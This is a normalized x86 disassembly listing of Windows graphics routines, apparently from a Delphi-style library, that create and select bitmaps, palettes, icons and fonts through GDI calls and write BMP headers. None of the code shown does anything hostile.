mov eax [ ebp - 0x8 ]
call sub_415ca0
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_41dfa8
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42122f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_41e3e0
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026cc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_421197
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_415ca0
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_41dfa8
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_42116b
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41e698
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40c724
call sub_41de94
jmp r-xdata
xor eax eax
push ebp
push sub_4211fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_415ca0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421172
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421236
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40c724
call sub_41de94
jmp r-xdata
sub_421172
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026ec
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_421236
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402b04
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4212cb
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41e698
mov [ ebp - 0x30 ] eax
sub_4212e8
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_420c9c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42132c
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_420a2c
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_415ca0
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402b04
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_420c9c
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_420dc4
call sub_41de94
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_42139c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_420a2c
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b04
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_420044
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_421437
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_420c9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_421460
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_4208e8
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_420a2c
mov eax esi
call sub_420b3c
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_420a2c
mov eax esi
call sub_420b3c
mov eax esi
call sub_4209b8
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_420044
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_420448
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_420c9c
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_420c9c
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_41f9e0
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_421598
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_420a3c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_420448
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4215ec
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_420a3c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_420448
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42166c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_420a2c
mov eax ebx
call sub_420a3c
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_41f9e0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421703
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420c9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_41f8d8
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_41bf98
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_421708
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403894
call sub_4038e8
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_41f8d8
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421740
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_420a3c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_420448
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42179c
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b04
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_4209b8
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_41edd4
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_415cd8
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_415cd8
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b04
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_42087c
mov dl [ r-xdata ]
call sub_41dc90
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_41dfa8
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_41f994
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_415cd8
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_415cd8
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_415cd8
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_415cd8
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_415cd8
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_415cd8
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_41e418
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_415cd8
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_41e73c
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_421a5c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_420a3c
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_41f9e0
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_421ad6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_420044
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_421afc
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_4030f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_421b44
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41f110
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_41f80c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_421b98
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_41f810
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414000
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_421bc8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_421ea0
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_41f80c
mov eax [ esi + 0x28 ]
call sub_41f810
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41402c
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_421c28
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_41dc90
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_421c80
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_421cbc
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_415a94
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_415ca0
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_41e9e8
jmp r-xdata
jmp r-xdata
call sub_41dea0
sub_421d34
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421dc1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_421c80
cmp eax [ rw-data ]
jne r-xdata
call sub_41dea0
mov eax esi
call sub_421c80
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_41ef14
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402b04
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_415cd8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_421de8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421e76
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_415a74
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_415ca0
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_415ca0
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_421ea0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_41dea0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421e7b
mov eax [ ebp - 0x4 ]
call sub_4030f8
call sub_403894
call sub_4038e8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421ea0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421ee0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f80c
mov eax [ ebx + 0x28 ]
call sub_41f810
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_421f60
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_421d34
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_415cd8
pop esi
pop ebx
retn
sub_421fb0
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_41e4e8
mov [ rw-data ] eax
pop ebx
retn
sub_421fe8
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_42202c
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_421fe8
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_4220f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_422130
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax esi
call sub_422328
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_422174
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42215c
xor eax eax
push ebp
push sub_422215
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42221c
mov eax [ ebp - 0x4 ]
call sub_422168
retn
mov eax 0x10
call sub_4026cc
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_422228
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
